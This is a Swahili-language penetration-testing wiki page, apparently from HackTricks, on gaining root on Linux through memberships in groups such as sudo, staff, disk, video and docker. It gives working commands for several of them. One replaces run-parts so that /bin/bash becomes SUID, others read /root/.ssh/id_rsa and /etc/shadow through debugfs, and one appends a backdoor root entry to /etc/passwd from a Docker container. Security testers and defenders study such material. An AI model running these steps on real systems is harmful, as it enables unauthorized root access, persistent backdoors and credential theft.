# Vikundi vya Kuvutia - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Vikundi vya Sudo/Admin

### **PE - Method 1**

**Wakati mwingine**, sera ya **/etc/sudoers** ya mfumo (au faili iliyojumuishwa kutoka humo) huwa na maingizo kama vile:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kuwa mtumiaji yeyote anayelingana na ingizo lolote kati ya hayo anaweza kutekeleza amri yoyote kama mtumiaji yeyote anayelengwa kupitia `sudo` (kwa kuzingatia sehemu nyingine za sera).<sup>[[3]](#references)</sup>

Ikiwa ndivyo ilivyo, ili **kuwa root unaweza kutekeleza tu**:
```
sudo su
```
### PE - Method 2

Tafuta binary zote za suid na uangalie kama kuna binary **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Ikiwa **pkexec ni SUID binary**, inaweza kutekeleza programu kama mtumiaji mwingine tu wakati polkit imeidhinisha kitendo kilichoombwa; SUID bit pekee haihakikishi root. Kagua policy iliyosakinishwa na authorization ya session ya target badala ya kudhani kuwa kuwa mwanachama wa **sudo** au **admin** kunatosha.<sup>[[4]](#references)[[5]](#references)</sup>

Kwenye distributions ambazo bado zinatumia Local Authority backend ya zamani, kagua group rules zake kwa kutumia:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Majina ya makundi husika na mipangilio chaguomsingi hutofautiana kulingana na distribution; kundi linafaa hapa tu ikiwa sera ya ndani imelipa jina.<sup>[[5]](#references)</sup>

**Ili kuwa root unaweza kutekeleza**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
Ukijaribu kutekeleza **pkexec** na ukapata **kosa** hili:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
Katika SSH session isiyo na authentication agent iliyosajiliwa, `pkexec` inaweza kushindwa kwa kosa hili hata wakati policy ingeruhusu kitendo hicho; polkit inaandika `pkttyagent` kama text authentication agent kwa sessions zisizo za desktop. Tabia halisi hutegemea version na distribution, kwa hivyo thibitisha policy ya ndani na usanidi wa agent. Workaround moja iliyoripotiwa kwa versions zilizoathiriwa za NixOS hutumia **2 different SSH sessions**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Kundi la Wheel

Wakati mwingine sera ya sudoers inaweza pia kuwa na ingizo hili:
```
%wheel	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kwamba mtumiaji yeyote anayelingana na ingizo hilo anaweza kuendesha amri yoyote kama mtumiaji lengwa yeyote kupitia `sudo` (kulingana na masharti mengine ya policy).<sup>[[3]](#references)</sup>

Ikiwa ndivyo ilivyo, ili **kuwa root unaweza kutekeleza tu**:
```
sudo su
```
## Kundi la Shadow

Kwenye mifumo ambayo permissions zake zinaruhusu, watumiaji walio katika kundi la **shadow** wanaweza **kusoma** **/etc/shadow**; thibitisha mode na ACL halisi kwenye target:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Kwa hiyo, soma file na ujaribu **crack baadhi ya hashes**.

Ufafanuzi muhimu kuhusu hali ya lock wakati wa kuchambua hashes:
- Entries zilizo na `!` au `*` kwa kawaida haziruhusu mwingiliano wa login kwa kutumia password.
- `!hash` inamaanisha password imefungwa; herufi zilizobaki zinawakilisha password field kabla haijafungwa.
- Field iliyo na `*` si `crypt(3)` hash halali na huzuia UNIX-password login; usihitimishe kutokana nayo ikiwa password iliwekwa hapo awali.
Hii ni muhimu kwa kuainisha akaunti hata wakati direct login imezuiwa.<sup>[[6]](#references)</sup>

## Group ya Staff

**staff**: Huwaruhusu users kuongeza marekebisho ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji root privileges (kumbuka kwamba executables katika `/usr/local/bin` ziko kwenye PATH variable ya user yeyote, na zinaweza "override" executables katika `/bin` na `/usr/bin` zenye jina linalofanana). Linganisha na group "adm", ambayo inahusiana zaidi na monitoring/security.<sup>[[2]](#references)[[7]](#references)</sup>

Katika Debian configurations ambapo `/usr/local/bin` hutangulia `/usr/bin` kwenye `PATH` (kama ilivyo kwenye mifano hapa chini), command isiyo na path kamili hurejelea kwanza copy iliyo katika `/usr/local/bin`; thibitisha `PATH` inayotumika kwenye target.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Ikiwa privileged process itatatua command isiyo na path kamili kupitia `/usr/local/bin` inayoweza kuandikwa, kubadilisha command hiyo kunaweza kuiendesha kwa privileges za process; thibitisha path halisi na trigger kabla ya kufanya testing.

Kwenye mifumo ya Ubuntu, `pam_motd` huendesha executable scripts kupitia `run-parts --lsbsysinit` kama root wakati wa kuingia; cron jobs pia zinaweza kutumia `run-parts`, lakini hili hutegemea distribution na configuration.<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
Katika kuingia mpya kwa SSH, `pspy` inaweza kusaidia kuthibitisha ikiwa njia hii inatumika kwenye target; inaweza kuchunguza mistari ya amri ya michakato bila root.<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Uanachama katika kundi la **disk** unaweza kutoa ufikiaji wa moja kwa moja wa vifaa vya block na mara nyingi huwa **karibu sawa na root access**; Debian inaeleza kuwa kwa kiasi kikubwa ni sawa na root, lakini thibitisha ruhusa halisi za kifaa na mpangilio wa storage kwenye target.<sup>[[7]](#references)</sup>

Njia za kawaida za vifaa zinajumuisha `/dev/sd*`, lakini NVMe na mipangilio mingine ya storage hutumia majina tofauti.
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs` hufanya kazi kwenye filesystems za ext2/ext3/ext4; paths kama `/root` na `/etc/shadow` zilizo hapo juu ni mafaili ndani ya filesystem iliyofunguliwa, huku argument ya pili ya `dump` ikiwa ni output path kwenye filesystem asilia.<sup>[[8]](#references)</sup> Kwa mfano, hii hutoa `/tmp/asd1.txt` kutoka kwenye filesystem iliyofunguliwa na kuiweka kwenye `/tmp/asd2.txt` kwenye filesystem asilia:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Chaguo la `-w` hufungua mfumo wa faili kwa ajili ya kusoma na kuandika, na amri ya `write` hunakili faili asili ndani ya mfumo wa faili uliofunguliwa. Epuka kuitumia kwenye mfumo wa faili uliowekwa kama mounted na unaotumika, kwa sababu uhariri wa moja kwa moja unaweza kuharibu mfumo wa faili; inapowezekana, fanyia kazi image ya offline.<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Kikundi cha Video

Kwa kutumia amri `w` unaweza kupata **nani ameingia kwenye mfumo** na itaonyesha matokeo kama yafuatayo.<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Ingizo la **tty1** linabainisha koni ya kwanza ya Linux; lenyewe halithibitishi kwamba mtumiaji yupo kimwili kwenye mashine, hasa katika containers au mazingira mengine.<sup>[[21]](#references)</sup>

Kwenye mifumo inayowezesha kifaa cha framebuffer kusomeka, uanachama katika group la **video** unaweza kutoa ufikiaji wa kifaa hicho. Kiolesura cha Linux framebuffer kinaandika `/dev/fb0` kama kifaa cha kumbukumbu kinachoweza kusomeka na kunakiliwa kwa ajili ya kuchukua picha ya skrini; path ya `/sys/class/graphics/fb0/virtual_size` inapatikana tu pale ambapo fbdev sysfs attribute hiyo ipo, kwa hivyo kagua target kwanza.<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Ikiwa toleo la **GIMP** lililosakinishwa linaonyesha raw-data importer, fungua **`screen.raw`** kwa kutumia importer hiyo; support na controls hutofautiana kulingana na toleo na plug-in.<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Ili kufungua raw image unaweza kutumia GIMP, chagua faili ya screen.raw na uchague Raw image data kama aina ya faili](<../../../images/image (463).png>)

Weka Width na Height ya image ilingane na framebuffer geometry; jaribu pixel formats/Image Types zinazopatikana hadi output iweze kusomeka.<sup>[[9]](#references)</sup>

![Disk Group - Video Group: Kisha badilisha Width na Height ziwe zile zinazotumiwa kwenye screen na uangalie Image Types tofauti (na uchague inayoonyesha screen vizuri zaidi)](<../../../images/image (317).png>)

## Root Group

Uanachama katika **root** group hautoi UID ya root, lakini files zinazoweza kuandikwa na group na zinazomilikiwa na `root` bado zinaweza kuwa muhimu wakati privileged services au libraries zinazitumia. Thibitisha permissions halisi za file na jinsi linavyotumiwa kabla ya kulichukulia kama njia ya privilege-escalation.

**Kagua ni files zipi ambazo members wa root wanaweza kurekebisha**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Uanachama katika kundi la `docker` hutoa ufikiaji wa kiwango cha root kwa Docker daemon kwenye installs za kawaida za rootful. Kwa kuwa bind mounts huwa za read-write kwa chaguomsingi, mtumiaji anayeweza kudhibiti daemon hiyo anaweza kuweka host ya `/` ndani ya container na kubadilisha mafaili ya host; jambo hili kwa ufanisi hutoa root kwenye host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
Hatimaye, ikiwa hupendi mapendekezo yoyote ya awali, au hayafanyi kazi kwa sababu fulani (docker api firewall?), unaweza kila mara kujaribu **kuendesha privileged container na kutoroka kutoka humo** kama ilivyoelezwa hapa:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Ikiwa una ruhusa za kuandika kwenye docker socket, soma [**chapisho hili kuhusu jinsi ya kuongeza privileges kwa kutumia vibaya docker socket**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

Kwa kawaida **members** wa group **`adm`** huwa na ruhusa za **kusoma log** files zilizo ndani ya _/var/log/_.\
Kwa hiyo, ikiwa umecompromise user aliye ndani ya group hili, hakikisha kabisa **unaangalia logs**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

Groups hizi zina maana zinazotegemea service na distribution. Debian inaeleza `backup` kwa backup/restore iliyokabidhiwa, `lp` kwa printer daemons, na `mail` kwa `/var/mail`; kwa hiyo kagua ruhusa za local kabla ya kuchukulia membership kuwa njia ya privilege.<sup>[[7]](#references)</sup>

Mara nyingi huwa vectors za **credential-discovery** badala ya vectors za moja kwa moja za root:
- **backup**: inaweza kufichua archives zilizo na configs, keys, DB dumps, au tokens.
- **operator**: ufikiaji wa kiutendaji unaotegemea platform ambao unaweza ku-leak data nyeti ya runtime.
- **lp**: print queues/spools zinaweza kuwa na maudhui ya documents.
- **mail**: mail spools zinaweza kufichua reset links, OTPs, na credentials za ndani.

Chukulia membership katika groups hizi kama finding yenye thamani kubwa ya data exposure, kisha pivot kupitia password/token reuse.

## Auth group

Kwenye OpenBSD, S/Key inapokuwa configured, `/etc/skey` inamilikiwa na `root:auth` na ufikiaji wa records zake unahitaji group `auth`; records za YubiKey huhifadhiwa kwenye `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Configuration iliyo vulnerable ya OpenBSD 6.6 yenye S/Key au YubiKey iliyowezeshwa iliwaruhusu local users wenye privileges za `auth` kuwa root; Qualys inaeleza sharti hilo na exploit chain, na PoC iliyounganishwa inaiimplement.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [pkexec/pkttyagent authentication bila GUI session (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Mwongozo wa Kulinda Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Kifaa cha Frame Buffer — Linux Kernel documentation](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
- [13] [Usalama wa Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Manage Docker kama non-root user](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Running containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [Authentication vulnerabilities katika OpenBSD — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux manual page](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux allocated devices (4.x+ version)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Image Import and Export — GIMP Documentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
